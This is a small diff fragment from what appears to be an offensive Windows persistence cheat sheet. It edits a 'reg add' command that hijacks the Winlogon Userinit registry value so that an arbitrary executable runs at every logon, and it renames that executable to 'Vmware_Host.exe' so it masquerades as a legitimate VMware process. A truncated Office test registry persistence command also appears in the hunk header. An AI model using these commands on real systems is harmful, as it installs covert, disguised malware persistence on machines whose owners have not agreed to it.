@@ -31,7 +31,7 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_S
 ```
 ### Winlogon Persistent
 ```
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Binary.exe","C:\Windows\system32\userinit.exe"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Vmware_Host.exe","C:\Windows\system32\userinit.exe"
 
 ```
 
